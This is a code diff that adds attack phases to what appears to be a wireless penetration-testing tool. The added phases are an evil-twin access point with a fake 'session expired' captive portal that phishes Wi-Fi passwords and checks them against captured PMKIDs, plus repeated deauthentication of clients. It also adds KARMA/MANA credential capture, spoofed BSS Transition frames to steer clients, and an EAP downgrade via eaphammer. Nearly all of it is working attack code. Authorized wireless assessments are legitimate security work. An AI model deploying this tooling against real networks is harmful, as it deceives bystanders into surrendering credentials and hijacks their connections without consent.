@@ -42,8 +42,16 @@ from datetime import datetime
 from html.parser import HTMLParser as _HTMLParser
 from itertools import permutations as _permutations
 from pathlib import Path
+import hashlib
+import hmac
+import ipaddress
+import queue
+import socket
+import struct
+import threading
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-VERSION = "1.5.5"
+VERSION = "1.6.0"
 
 
 def _clients_base() -> Path:
@@ -2303,6 +2311,1339 @@ def phase_krack(
     status("p5_krack", "Phase 5: KRACK Testing", "complete")
 
 
+
+# ── Captive portal constants ─────────────────────────────────────────────────
+
+_CAPTIVE_IP   = "192.168.88.1"
+_CAPTIVE_CIDR = "192.168.88.0/24"
+_CAPTIVE_PORT = 8080
+_CAPTIVE_DHCP_START = "192.168.88.100"
+_CAPTIVE_DHCP_END   = "192.168.88.200"
+
+_CAPTIVE_HTML = """\
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Network Login</title>
+<style>
+body{{margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;
+     background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif}}
+.card{{background:#fff;border-radius:12px;padding:2.5rem;width:90%;max-width:380px;
+      box-shadow:0 4px 24px rgba(0,0,0,.12)}}
+h2{{margin:0 0 .5rem;font-size:20px;color:#1a1a2e}}
+p{{margin:0 0 1.5rem;font-size:14px;color:#555;line-height:1.5}}
+label{{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:.4rem}}
+input{{width:100%;box-sizing:border-box;padding:.7rem 1rem;border:1.5px solid #ddd;
+      border-radius:8px;font-size:15px;outline:none}}
+input:focus{{border-color:#4a9ad0}}
+button{{width:100%;padding:.85rem;margin-top:1rem;background:#4a9ad0;color:#fff;
+        border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}}
+button:hover{{background:#3a8ac0}}
+.hint{{font-size:12px;color:#888;margin-top:.4rem}}
+.err{{color:#e74c3c;font-size:13px;margin-top:.5rem}}
+</style></head>
+<body><div class="card">
+<h2>&#128246; {ssid}</h2>
+<p>Your wireless session has expired. Please re-enter the network password to continue.</p>
+<form method="POST" action="/"><label>Wi-Fi Password</label>
+<input type="password" name="psk" placeholder="Network password" required autofocus>
+{error}
+<button type="submit">Continue</button>
+<div class="hint">You will be reconnected automatically after authenticating.</div>
+</form></div></body></html>"""
+
+_CAPTIVE_SUCCESS_HTML = """\
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>Connecting...</title>
+<style>body{{font-family:-apple-system,sans-serif;display:flex;justify-content:center;
+align-items:center;min-height:100vh;background:#f0f2f5}}
+.card{{background:#fff;border-radius:12px;padding:2.5rem;text-align:center;
+box-shadow:0 4px 24px rgba(0,0,0,.12)}}h2{{color:#27ae60}}</style></head>
+<body><div class="card"><h2>&#10003; Connected</h2>
+<p>Reconnecting to the network, please wait...</p></div></body></html>"""
+
+_cracked_psks: dict = {}
+
+
+# ── Rogue AP / captive portal helpers ────────────────────────────────────────
+
+def _find_ap_interface(exclude_ifaces: list) -> str:
+    if platform.system() != "Linux":
+        return ""
+    net = Path("/sys/class/net")
+    if not net.exists():
+        return ""
+    for p in sorted(net.iterdir()):
+        name = p.name
+        if name in exclude_ifaces:
+            continue
+        if not ((p / "wireless").exists() or (p / "phy80211").exists()):
+            continue
+        try:
+            out, _ = _run(["iw", "dev", name, "info"], timeout=5)
+            m = re.search(r"wiphy\s+(\d+)", out)
+            if not m:
+                continue
+            phy_out, _ = _run(["iw", "phy", f"phy{m.group(1)}", "info"], timeout=5)
+            if re.search(r"^\s+\* AP\b", phy_out, re.M):
+                return name
+        except Exception:
+            pass
+    return ""
+
+
+def _psk_matches_pmkid(ssid: str, psk: str, ap_mac_hex: str,
+                        client_mac_hex: str, pmkid_hex: str) -> bool:
+    try:
+        pmk   = hashlib.pbkdf2_hmac("sha1", psk.encode(), ssid.encode(), 4096, 32)
+        ap_b  = bytes.fromhex(ap_mac_hex.replace(":", "").replace("-", ""))
+        cli_b = bytes.fromhex(client_mac_hex.replace(":", "").replace("-", ""))
+        h     = hmac.new(pmk, b"PMK Name" + ap_b + cli_b, hashlib.sha1)
+        return h.digest()[:16].hex().lower() == pmkid_hex.lower().strip()
+    except Exception:
+        return False
+
+
+def _load_pmkid_entries(output_dir: Path) -> list:
+    """Return [(pmkid_hex, ap_mac_hex, client_mac_hex, ssid)] from any .hc22000 in output_dir."""
+    entries = []
+    for f in output_dir.rglob("*.hc22000"):
+        try:
+            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
+                line = line.strip()
+                if not line.startswith("WPA*01*"):
+                    continue
+                parts = line.split("*")
+                if len(parts) < 6:
+                    continue
+                pmkid_hex, ap_mac, cli_mac, ssid_hex = parts[2], parts[3], parts[4], parts[5]
+                try:
+                    ssid = bytes.fromhex(ssid_hex).decode("utf-8", errors="replace")
+                except Exception:
+                    ssid = ssid_hex
+                entries.append((pmkid_hex, ap_mac, cli_mac, ssid))
+        except Exception:
+            pass
+    return entries
+
+
+def _collect_cracked_psks(output_dir: Path) -> dict:
+    """Scan phase output directories for cracked PSKs. Returns {bssid_upper: psk}."""
+    result = {}
+    for f in output_dir.rglob("*.pot"):
+        try:
+            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
+                if ":" not in line:
+                    continue
+                hash_part, psk = line.rsplit(":", 1)
+                psk = psk.strip()
+                if not (8 <= len(psk) <= 63):
+                    continue
+                parts = hash_part.split("*")
+                if len(parts) >= 4:
+                    mac = parts[3].upper()
+                    bssid = ":".join(mac[i:i+2] for i in range(0, 12, 2))
+                    result[bssid] = psk
+        except Exception:
+            pass
+    for f in output_dir.rglob("wpa*.txt"):
+        try:
+            for line in f.read_text(encoding="utf-8", errors="replace").splitlines():
+                parts = line.split()
+                if len(parts) >= 2 and re.match(r"([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}", parts[0]):
+                    result[parts[0].upper()] = parts[-1].strip()
+        except Exception:
+            pass
+    return result
+
+
+def _assign_ip_to_iface(iface: str, ip_cidr: str) -> bool:
+    try:
+        subprocess.run(["ip", "addr", "flush", "dev", iface],
+                       check=False, capture_output=True)
+        subprocess.run(["ip", "addr", "add", ip_cidr, "dev", iface],
+                       check=True, capture_output=True)
+        subprocess.run(["ip", "link", "set", iface, "up"],
+                       check=True, capture_output=True)
+        return True
+    except Exception as exc:
+        err(f"Could not assign {ip_cidr} to {iface}: {exc}")
+        return False
+
+
+def _write_hostapd_conf(ssid: str, bssid: str, channel: int,
+                         encryption: str, psk: str, ap_iface: str,
+                         work_dir: Path) -> Path:
+    enc_up = (encryption or "").upper()
+    if psk and ("WPA" in enc_up or "WPA2" in enc_up):
+        security = (
+            f"wpa=2\nwpa_passphrase={psk}\n"
+            f"wpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"
+        )
+    else:
+        security = ""
+    conf = (
+        f"interface={ap_iface}\n"
+        f"driver=nl80211\n"
+        f"ssid={ssid}\n"
+        f"hw_mode=g\n"
+        f"channel={channel or 6}\n"
+        f"ignore_broadcast_ssid=0\n"
+        f"bssid={bssid}\n" if bssid else ""
+    ) + security
+    conf_path = work_dir / "hostapd.conf"
+    conf_path.write_text(conf, encoding="utf-8")
+    return conf_path
+
+
+def _write_dnsmasq_conf(ap_iface: str, work_dir: Path) -> Path:
+    conf = (
+        f"interface={ap_iface}\n"
+        f"bind-interfaces\n"
+        f"dhcp-range={_CAPTIVE_DHCP_START},{_CAPTIVE_DHCP_END},12h\n"
+        f"dhcp-option=3,{_CAPTIVE_IP}\n"
+        f"dhcp-option=6,{_CAPTIVE_IP}\n"
+        f"address=/#/{_CAPTIVE_IP}\n"
+        f"no-resolv\n"
+        f"log-dhcp\n"
+    )
+    conf_path = work_dir / "dnsmasq.conf"
+    conf_path.write_text(conf, encoding="utf-8")
+    return conf_path
+
+
+def _iptables_captive_setup(ap_iface: str) -> None:
+    cmds = [
+        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_iface,
+         "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
+        ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", ap_iface,
+         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
+        ["iptables", "-A", "FORWARD", "-i", ap_iface, "-j", "DROP"],
+    ]
+    for c in cmds:
+        subprocess.run(c, check=False, capture_output=True)
+
+
+def _iptables_captive_teardown(ap_iface: str) -> None:
+    cmds = [
+        ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", ap_iface,
+         "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
+        ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", ap_iface,
+         "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(_CAPTIVE_PORT)],
+        ["iptables", "-D", "FORWARD", "-i", ap_iface, "-j", "DROP"],
+    ]
+    for c in cmds:
+        subprocess.run(c, check=False, capture_output=True)
+
+
+def _iptables_nat_setup(ap_iface: str, upstream_iface: str) -> None:
+    subprocess.run(["sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
+                   check=False, capture_output=True)
+    cmds = [
+        ["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", upstream_iface, "-j", "MASQUERADE"],
+        ["iptables", "-A", "FORWARD", "-i", ap_iface, "-o", upstream_iface, "-j", "ACCEPT"],
+        ["iptables", "-A", "FORWARD", "-i", upstream_iface, "-o", ap_iface,
+         "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
+    ]
+    for c in cmds:
+        subprocess.run(c, check=False, capture_output=True)
+
+
+def _iptables_nat_teardown(ap_iface: str, upstream_iface: str) -> None:
+    cmds = [
+        ["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", upstream_iface, "-j", "MASQUERADE"],
+        ["iptables", "-D", "FORWARD", "-i", ap_iface, "-o", upstream_iface, "-j", "ACCEPT"],
+        ["iptables", "-D", "FORWARD", "-i", upstream_iface, "-o", ap_iface,
+         "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
+    ]
+    for c in cmds:
+        subprocess.run(c, check=False, capture_output=True)
+
+
+class _PortalHandler(BaseHTTPRequestHandler):
+    ssid          = ""
+    pmkid_entries = []
+    result_q      = None
+    captured_psks = []
+
+    def log_message(self, fmt, *args):
+        pass
+
+    def _send_html(self, code: int, body: str) -> None:
+        data = body.encode("utf-8")
+        self.send_response(code)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(data)))
+        self.end_headers()
+        self.wfile.write(data)
+
+    def do_GET(self):
+        if self.path not in ("/", "/portal", "/generate_204", "/hotspot-detect.html"):
+            self.send_response(302)
+            self.send_header("Location", f"http://{_CAPTIVE_IP}:{_CAPTIVE_PORT}/")
+            self.end_headers()
+            return
+        html = _CAPTIVE_HTML.format(ssid=self.ssid, error="")
+        self._send_html(200, html)
+
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body   = self.rfile.read(length).decode("utf-8", errors="replace")
+        params = urllib.parse.parse_qs(body)
+        psk    = (params.get("psk", [""])[0]).strip()
+        if not psk:
+            html = _CAPTIVE_HTML.format(ssid=self.ssid,
+                                        error='<div class="err">Password cannot be empty.</div>')
+            self._send_html(200, html)
+            return
+        _PortalHandler.captured_psks.append(psk)
+        valid = False
+        for pmkid_hex, ap_mac, cli_mac, cap_ssid in _PortalHandler.pmkid_entries:
+            if _psk_matches_pmkid(self.ssid or cap_ssid, psk, ap_mac, cli_mac, pmkid_hex):
+                valid = True
+                break
+        if valid and _PortalHandler.result_q is not None:
+            _PortalHandler.result_q.put(("valid", psk))
+        elif _PortalHandler.result_q is not None:
+            _PortalHandler.result_q.put(("captured", psk))
+        self._send_html(200, _CAPTIVE_SUCCESS_HTML)
+
+
+def _run_portal_server(stop_evt: threading.Event) -> None:
+    try:
+        server = HTTPServer((_CAPTIVE_IP, _CAPTIVE_PORT), _PortalHandler)
+        server.timeout = 1.0
+        while not stop_evt.is_set():
+            server.handle_request()
+        server.server_close()
+    except Exception as exc:
+        err(f"Captive portal error: {exc}")
+
+
+# ── Phase 6a: Rogue AP / Evil Twin ────────────────────────────────────────────
+
+def phase_rogue_ap(monitor_iface: str, primary_iface: str, target_aps: list,
+                   enriched_aps: list, output_dir: Path, rogue_cfg: dict,
+                   timeout: int, cracked_psks: dict = None) -> None:
+    status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "running")
+    cracked_psks = cracked_psks or {}
+
+    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
+    if not ap_iface:
+        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
+    if not ap_iface:
+        log("Phase 6: No second wireless interface found — skipping Rogue AP.")
+        log("  Set rogue_ap.ap_interface in config to specify one explicitly.")
+        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "skipped")
+        return
+
+    aps = target_aps or enriched_aps
+    if not aps:
+        log("Phase 6: No target APs — skipping.")
+        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "skipped")
+        return
+
+    best = sorted(aps, key=lambda a: a.get("score", 0), reverse=True)[0]
+    ssid       = best.get("ssid", "")
+    bssid      = best.get("bssid", "")
+    channel    = int(best.get("channel") or 6)
+    encryption = (best.get("encryption") or "").upper()
+    psk        = cracked_psks.get(bssid.upper(), "")
+
+    use_portal  = rogue_cfg.get("phishing_portal", True) and not psk
+    use_psk_ap  = bool(psk) and not use_portal
+    deauth_cl   = rogue_cfg.get("deauth_clients", False)
+    duration    = int(rogue_cfg.get("portal_duration", 180))
+
+    rogue_dir = output_dir / "rogue_ap"
+    rogue_dir.mkdir(exist_ok=True)
+    log(f"Phase 6: Interface={ap_iface}  Target={ssid!r} [{bssid}]  "
+        f"Mode={'WPA2+PSK' if use_psk_ap else 'Open+Portal' if use_portal else 'Open'}")
+
+    # Assign IP to AP interface
+    if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
+        status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "error")
+        return
+
+    # Write configs
+    ha_conf = _write_hostapd_conf(
+        ssid, bssid, channel,
+        "WPA2" if use_psk_ap else "OPEN", psk if use_psk_ap else "",
+        ap_iface, rogue_dir,
+    )
+    dm_conf = _write_dnsmasq_conf(ap_iface, rogue_dir)
+
+    # Load PMKID entries for portal validation
+    pmkid_entries = _load_pmkid_entries(output_dir)
+    _PortalHandler.ssid = ssid
+    _PortalHandler.pmkid_entries = pmkid_entries
+    _PortalHandler.captured_psks = []
+    portal_q   = queue.Queue()
+    _PortalHandler.result_q = portal_q
+    stop_portal = threading.Event()
+
+    hostapd_proc  = None
+    dnsmasq_proc  = None
+    captured_psk  = None
+    connected_clients = []
+
+    try:
+        # Start dnsmasq
+        dnsmasq_log = rogue_dir / "dnsmasq.log"
+        dnsmasq_proc = subprocess.Popen(
+            ["dnsmasq", "--conf-file=" + str(dm_conf),
+             "--pid-file=" + str(rogue_dir / "dnsmasq.pid"),
+             "--log-facility=" + str(dnsmasq_log), "--no-daemon"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        time.sleep(0.5)
+
+        # Start hostapd
+        hostapd_log = rogue_dir / "hostapd.log"
+        with open(hostapd_log, "w") as hlog:
+            hostapd_proc = subprocess.Popen(
+                ["hostapd", str(ha_conf)],
+                stdout=hlog, stderr=hlog,
+            )
+        time.sleep(2)
+        if hostapd_proc.poll() is not None:
+            err("Phase 6: hostapd failed to start — check hostapd.log")
+            status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "error")
+            return
+
+        log(f"Phase 6: Rogue AP '{ssid}' active on {ap_iface} (channel {channel})")
+
+        if use_portal:
+            _iptables_captive_setup(ap_iface)
+            portal_thread = threading.Thread(
+                target=_run_portal_server, args=(stop_portal,), daemon=True
+            )
+            portal_thread.start()
+            log("Phase 6: Captive portal active — waiting for client credentials")
+
+        # Periodic deauth to force client reconnection to rogue AP
+        deauth_t = None
+        if deauth_cl:
+            def _deauth_loop():
+                while not stop_portal.is_set():
+                    for ap in aps:
+                        for cl in (ap.get("clients") or []):
+                            _run(["aireplay-ng", "--deauth", "3",
+                                  "-a", ap["bssid"], "-c", cl["mac"],
+                                  monitor_iface], timeout=10)
+                    time.sleep(15)
+            deauth_t = threading.Thread(target=_deauth_loop, daemon=True)
+            deauth_t.start()
+
+        deadline = time.time() + duration
+        while time.time() < deadline:
+            time.sleep(2)
+            # Check for captured PSK from portal
+            while not portal_q.empty():
+                kind, val = portal_q.get_nowait()
+                log(f"Phase 6: PSK {'validated' if kind=='valid' else 'captured'}: "
+                    f"{val[:4]}{'*'*(len(val)-4)}")
+                captured_psk = val
+                _cracked_psks[bssid.upper()] = val
+
+            # Check clients in dnsmasq leases
+            leases_file = Path("/var/lib/misc/dnsmasq.leases")
+            if not leases_file.exists():
+                leases_file = rogue_dir / "dnsmasq.leases"
+            if leases_file.exists():
+                try:
+                    for line in leases_file.read_text().splitlines():
+                        parts = line.split()
+                        if len(parts) >= 4:
+                            entry = {"mac": parts[1], "ip": parts[2], "hostname": parts[3]}
+                            if entry not in connected_clients:
+                                connected_clients.append(entry)
+                                log(f"Phase 6: Client connected → {parts[2]} ({parts[1]})")
+                except Exception:
+                    pass
+
+        stop_portal.set()
+
+        # Report findings
+        findings_data = {
+            "ssid": ssid, "bssid": bssid, "channel": channel,
+            "ap_interface": ap_iface,
+            "clients_connected": len(connected_clients),
+            "clients": connected_clients,
+            "psk_captured": captured_psk or "",
+            "psk_validated": bool(pmkid_entries and captured_psk),
+            "portal_mode": use_portal,
+        }
+        (rogue_dir / "rogue_ap_results.json").write_text(
+            json.dumps(findings_data, indent=2), encoding="utf-8"
+        )
+
+        if connected_clients:
+            finding_from_cat(
+                "rogue_ap_clients",
+                data=findings_data,
+                output_file=str(rogue_dir / "rogue_ap_results.json"),
+                title_override=f"Clients Auto-Associated to Rogue AP: {ssid}",
+            )
+        if captured_psk:
+            finding_from_cat(
+                "psk_phished",
+                data=findings_data,
+                output_file=str(rogue_dir / "rogue_ap_results.json"),
+                title_override=f"WPA Passphrase Captured via Phishing Portal: {ssid}",
+            )
+        log(f"Phase 6: Complete — {len(connected_clients)} client(s) connected"
+            + (f", PSK captured" if captured_psk else ""))
+
+    finally:
+        stop_portal.set()
+        if use_portal:
+            _iptables_captive_teardown(ap_iface)
+        for proc in (hostapd_proc, dnsmasq_proc):
+            if proc and proc.poll() is None:
+                _kill_proc(proc)
+        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
+                       check=False, capture_output=True)
+
+    status("p6_rogue_ap", "Phase 6: Rogue AP / Evil Twin", "complete")
+
+
+# ── Phase 6b: KARMA / MANA ────────────────────────────────────────────────────
+
+def phase_karma(monitor_iface: str, primary_iface: str, output_dir: Path,
+                rogue_cfg: dict, timeout: int) -> None:
+    status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "running")
+
+    ap_iface = (rogue_cfg.get("ap_interface") or "").strip()
+    if not ap_iface:
+        ap_iface = _find_ap_interface([monitor_iface, primary_iface])
+    if not ap_iface:
+        log("Phase 6b: No second wireless interface — skipping KARMA.")
+        status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "skipped")
+        return
+
+    karma_dir = output_dir / "karma"
+    karma_dir.mkdir(exist_ok=True)
+    duration  = int(rogue_cfg.get("portal_duration", 120))
+
+    # Prefer hostapd-mana; fall back to bettercap
+    hostapd_mana = shutil.which("hostapd-mana")
+    bettercap    = shutil.which("bettercap")
+
+    if hostapd_mana:
+        conf_content = (
+            "interface=" + ap_iface + "\n"
+            "driver=nl80211\n"
+            "ssid=FreeWiFi\n"
+            "hw_mode=g\n"
+            "channel=6\n"
+            "mana_wpe=1\n"
+            "mana_credout=" + str(karma_dir / "karma_credentials.txt") + "\n"
+            "enable_mana=1\n"
+            "enable_sycophant=1\n"
+        )
+        conf_path = karma_dir / "hostapd_mana.conf"
+        conf_path.write_text(conf_content, encoding="utf-8")
+        log(f"Phase 6b: Starting KARMA attack via hostapd-mana on {ap_iface}")
+        if not _assign_ip_to_iface(ap_iface, f"{_CAPTIVE_IP}/24"):
+            status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "error")
+            return
+        dm_conf  = _write_dnsmasq_conf(ap_iface, karma_dir)
+        dnsmasq_proc = subprocess.Popen(
+            ["dnsmasq", "--conf-file=" + str(dm_conf), "--no-daemon"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        karma_proc = subprocess.Popen(
+            [hostapd_mana, str(conf_path)],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        time.sleep(duration)
+        _kill_proc(karma_proc)
+        _kill_proc(dnsmasq_proc)
+        subprocess.run(["ip", "addr", "flush", "dev", ap_iface],
+                       check=False, capture_output=True)
+        cred_file = karma_dir / "karma_credentials.txt"
+        if cred_file.exists():
+            creds = cred_file.read_text(encoding="utf-8", errors="replace")
+            if creds.strip():
+                finding_from_cat(
+                    "karma_credentials",
+                    data={"credentials_raw": creds[:2000]},
+                    output_file=str(cred_file),
+                    title_override="WPA-Enterprise Credentials Captured via KARMA/MANA Attack",
+                )
+                log(f"Phase 6b: Credentials captured — see {cred_file}")
+            else:
+                log("Phase 6b: No credentials captured.")
+        else:
+            log("Phase 6b: No credential output generated.")
+
+    elif bettercap:
+        log(f"Phase 6b: Starting KARMA via bettercap on {monitor_iface}")
+        bc_script = karma_dir / "karma.cap"
+        bc_script.write_text(
+            "wifi.recon on\n"
+            f"set wifi.interface {monitor_iface}\n"
+            "wifi.assoc.flood on\n"
+            f"set events.stream.output {karma_dir}/karma_events.txt\n",
+            encoding="utf-8",
+        )
+        try:
+            out, rc = _run(
+                ["bettercap", "-iface", monitor_iface, "-caplet", str(bc_script)],
+                timeout=duration,
+            )
+            (karma_dir / "bettercap.log").write_text(out, encoding="utf-8")
+        except Exception as exc:
+            err(f"Phase 6b: bettercap error: {exc}")
+    else:
+        log("Phase 6b: Neither hostapd-mana nor bettercap found — skipping KARMA.")
+        status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "skipped")
+        return
+
+    status("p6b_karma", "Phase 6b: KARMA / MANA Attack", "complete")
+
+
+# ── Phase 7: Client-Side / Management Frame Attacks ───────────────────────────
+
+def _send_btm_request(monitor_iface: str, client_mac: str,
+                      ap_bssid: str, channel: int) -> bool:
+    try:
+        from scapy.all import RadioTap, Dot11, Raw, sendp  # type: ignore
+    except ImportError:
+        return False
+    try:
+        btm_body = bytes([
+            10,          # Category: WNM (Wireless Network Management)
+            7,           # Action: BSS Transition Management Request
+            0x01,        # Dialog Token
+            0x11,        # Request Mode: Preferred Candidate List | ESS Disassociation Imminent
+            0x00, 0x00,  # Disassociation Timer: 0 TBTTs (immediate)
+            0xFF,        # Validity Interval: 255 TBTTs
+        ])
+        frame = (
+            RadioTap() /
+            Dot11(type=0, subtype=13,
+                  addr1=client_mac, addr2=ap_bssid, addr3=ap_bssid) /
+            Raw(load=btm_body)
+        )
+        sendp(frame, iface=monitor_iface, count=5, inter=0.1, verbose=False)
+        return True
+    except Exception:
+        return False
+
+
+def phase_client_attacks(monitor_iface: str, target_aps: list,
+                          enriched_aps: list, output_dir: Path, timeout: int) -> None:
+    status("p7_client", "Phase 7: Client-Side / Management Frame Attacks", "running")
+    aps = target_aps or enriched_aps
+    ca_dir = output_dir / "client_attacks"
+    ca_dir.mkdir(exist_ok=True)
+    results = {"pmf": [], "btm": [], "probes": []}
+
+    # ── 7a: PMF enforcement ───────────────────────────────────────────────────
+    status("p7_pmf", "Phase 7a: PMF Enforcement Testing", "running")
+    for ap in aps:
+        bssid   = ap.get("bssid", "")
+        ssid    = ap.get("ssid", "")
+        channel = int(ap.get("channel") or 6)
+        clients = ap.get("clients") or []
+        if not bssid:
+            continue
+
+        enc_field = (ap.get("encryption") or "") + " " + (ap.get("auth") or "")
+        pmf_required  = bool(re.search(r"\bMFPR\b|\bSAE\b|WPA3", enc_field, re.I))
+        pmf_capable   = bool(re.search(r"\bMFPC\b|\bPMF\b", enc_field, re.I)) or pmf_required
+
+        # Attempt deauth against first observed client
+        deauth_worked = None
+        if clients:
+            client_mac = clients[0]["mac"]
+            out, rc = _run([
+                "aireplay-ng", "--deauth", "10",
+                "-a", bssid, "-c", client_mac, monitor_iface,
+            ], timeout=20)
+            deauth_worked = rc == 0 and "Sending 802.11 deauthentication" in out
+        else:
+            # Broadcast deauth
+            out, rc = _run([
+                "aireplay-ng", "--deauth", "5", "-a", bssid, monitor_iface,
+            ], timeout=15)
+            deauth_worked = rc == 0
+
+        finding_text = (
+            f"PMF Required: {pmf_required} | PMF Capable: {pmf_capable} | "
+            f"Deauth {'accepted' if deauth_worked else 'blocked'}"
+        )
+        result = {
+            "ssid": ssid, "bssid": bssid,
+            "pmf_required": pmf_required, "pmf_capable": pmf_capable,
+            "deauth_effective": deauth_worked,
+        }
+        results["pmf"].append(result)
+        log(f"Phase 7a PMF [{bssid}]: {finding_text}")
+
+        if not pmf_required:
+            finding_from_cat(
+                "pmf_not_enforced",
+                data=result,
+                output_file=str(ca_dir / "pmf_results.json"),
+                title_override=f"PMF Not Required: Management Frames Unprotected on {ssid}",
+            )
+
+    (ca_dir / "pmf_results.json").write_text(json.dumps(results["pmf"], indent=2), encoding="utf-8")
+    status("p7_pmf", "Phase 7a: PMF Enforcement Testing", "complete")
+
+    # ── 7b: BSS Transition Management hijacking ────────────────────────────────
+    status("p7_btm", "Phase 7b: BSS Transition Hijacking", "running")
+    btm_results = []
+    if not shutil.which("python3") or True:  # scapy check happens inside _send_btm_request
+        for ap in aps:
+            bssid   = ap.get("bssid", "")
+            ssid    = ap.get("ssid", "")
+            channel = int(ap.get("channel") or 6)
+            for client in (ap.get("clients") or []):
+                client_mac = client.get("mac", "")
+                if not client_mac:
+                    continue
+                log(f"Phase 7b: Sending BTM Request to {client_mac} → {ssid!r} [{bssid}]")
+                sent = _send_btm_request(monitor_iface, client_mac, bssid, channel)
+                btm_results.append({
+                    "ssid": ssid, "bssid": bssid,
+                    "client": client_mac, "sent": sent,
+                })
+                if sent:
+                    finding_from_cat(
+                        "btm_hijack",
+                        data={"ssid": ssid, "bssid": bssid, "client": client_mac},
+                        output_file=str(ca_dir / "btm_results.json"),
+                        title_override=f"BSS Transition Management Request Sent to {client_mac} on {ssid}",
+                    )
+        if not btm_results:
+            log("Phase 7b: No associated clients found for BTM targeting.")
+    (ca_dir / "btm_results.json").write_text(json.dumps(btm_results, indent=2), encoding="utf-8")
+    status("p7_btm", "Phase 7b: BSS Transition Hijacking", "complete")
+
+    # ── 7c: Probe request harvest analysis ────────────────────────────────────
+    status("p7_probes", "Phase 7c: Client Probe Harvest Analysis", "running")
+    probe_data = []
+    for ap in enriched_aps:
+        for client in (ap.get("clients") or []):
+            mac     = client.get("mac", "")
+            probes  = client.get("probes") or client.get("probe_ssids") or []
+            if mac and probes:
+                probe_data.append({"client_mac": mac, "probed_ssids": probes,
+                                    "seen_on_bssid": ap.get("bssid", "")})
+                log(f"Phase 7c: {mac} probing: {', '.join(probes)}")
+    if probe_data:
+        (ca_dir / "probe_harvest.json").write_text(
+            json.dumps(probe_data, indent=2), encoding="utf-8"
+        )
+        finding_from_cat(
+            "probe_harvest",
+            data={"count": len(probe_data), "clients": probe_data},
+            output_file=str(ca_dir / "probe_harvest.json"),
+            title_override=f"Client Preferred Network List Harvested: {len(probe_data)} Device(s)",
+        )
+    else:
+        log("Phase 7c: No probe request data available from Phase 0-I.")
+    status("p7_probes", "Phase 7c: Client Probe Harvest Analysis", "complete")
+
+    results["btm"]    = btm_results
+    results["probes"] = probe_data
+    status("p7_client", "Phase 7: Client-Side / Management Frame Attacks", "complete")
+
+
+# ── Phase 8: EAP Downgrade ────────────────────────────────────────────────────
+
+def phase_eap_downgrade(monitor_iface: str, target_aps: list,
+                         eaphammer_path: str, output_dir: Path, timeout: int) -> None:
+    status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "running")
+
+    enterprise_aps = [
+        ap for ap in target_aps
+        if re.search(r"MGT|EAP|Enterprise|802\.1[Xx]",
+                     (ap.get("auth") or "") + " " + (ap.get("encryption") or ""), re.I)
+    ]
+    if not enterprise_aps:
+        log("Phase 8: No WPA-Enterprise APs in scope — skipping EAP downgrade.")
+        status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "skipped")
+        return
+
+    ep_path = Path(eaphammer_path) if Path(eaphammer_path).exists() else Path(
+        shutil.which("eaphammer") or "/opt/eaphammer/eaphammer"
+    )
+    if not ep_path.exists():
+        log("Phase 8: eaphammer not found — skipping EAP downgrade.")
+        status("p8_eap_downgrade", "Phase 8: EAP Downgrade Attack", "skipped")
+        return
+
+    dg_dir = output_dir / "eap_downgrade"
+    dg_dir.mkdir(exist_ok=True)
+
+    for ap in enterprise_aps:
+        ssid    = ap.get("ssid", "")
+        bssid   = ap.get("bssid", "")
+        channel = int(ap.get("channel") or 6)
+        log(f"Phase 8: Downgrade attack on {ssid!r} [{bssid}]")
+        cred_file = dg_dir / f"creds_{bssid.replace(':','')}.txt"
+        cmd = [
+            str(ep_path), "--interface", monitor_iface,
+            "--essid", ssid, "--channel", str(channel),
+            "--auth", "wpa-eap",
+            "--creds",
+            "--negotiate", "balanced",  # allows downgrade to weaker EAP methods
+        ]
+        if bssid:
+            cmd += ["--bssid", bssid]
+        try:
+            out, rc = _run(cmd, timeout=min(timeout, 120))
+            (dg_dir / f"eaphammer_{bssid.replace(':','')}.log").write_text(
+                out, encoding="utf-8"
